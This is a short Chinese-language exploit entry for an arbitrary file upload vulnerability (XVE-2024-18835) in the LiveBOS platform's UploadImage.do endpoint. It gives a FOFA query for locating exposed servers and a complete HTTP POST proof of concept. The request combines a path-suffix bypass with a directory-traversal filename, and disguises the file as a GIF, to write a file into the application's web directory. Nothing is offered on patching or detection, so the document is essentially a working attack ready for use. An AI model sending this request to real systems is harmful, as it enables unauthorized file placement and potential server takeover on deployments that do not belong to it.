# 灵动业务架构平台(LiveBOS)系统UploadImage.do接口文件上传漏洞(XVE-2024-18835)

LiveBOS灵动业务架构平台，是面向对象的业务支撑平台与建模工具。  在LiveBos的UploadImage.do接口中，发现了一处任意文件上传漏洞，攻击者可利用该漏洞上传任意文件。

## fofa

```yaml
app="LiveBOS-框架"
```

## poc

```yaml
POST /feed/UploadImage.do;.css.jsp HTTP/1.1
Host:
Httpsendrequestex: true
User-Agent: PostmanRuntime/7.29.0
Accept: */*
Postman-Token: 049266bd-e740-40bf-845f-bc511296894e
Accept-Encoding: gzip, deflate
Cookie: zhzbsessionname=35FF312409BF3CAC561D5BC776643A05
Content-Type: multipart/form-data;boundary=--------------------------WebKitFormBoundaryxegqoxxi
Content-Length: 222

---WebKitFormBoundaryxegqoxxi
Content-Disposition:form-data;name="file";filename="../../../../../../././../../../../../java/fh/tomcat_fhxszsq/LiveBos/FormBuilder/
feed/jsp/vtnifpvi.js"
Content-Type: image/jpeg

GIF89a 123123123
---WebKitFormBoundaryxegqoxxi--
```

